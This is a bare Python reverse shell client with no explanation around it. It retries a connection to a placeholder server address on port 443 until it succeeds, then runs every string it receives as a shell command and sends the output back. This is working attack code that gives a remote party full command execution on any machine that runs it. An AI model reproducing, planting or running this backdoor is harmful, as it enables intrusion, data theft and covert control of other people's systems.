import socket
import os
import sys
import subprocess

addr = "<server_ip>"
port = 443


is_connected = False

while is_connected == False:
    try:
        s = socket.socket()
        s.connect((addr, port))
        is_connected = True
    except:
        continue

while True:
    recv_data = s.recv(1024)
    recv_data = str(recv_data, "utf-8")

    if recv_data == "exit":
        exit()
    
    subproc = subprocess.Popen([recv_data], stdout=subprocess.PIPE, shell=True, stderr=subprocess.STDOUT)
    stdout, stderr = subproc.communicate()
    stdout = str(stdout, "utf-8").encode()

    s.send(stdout)
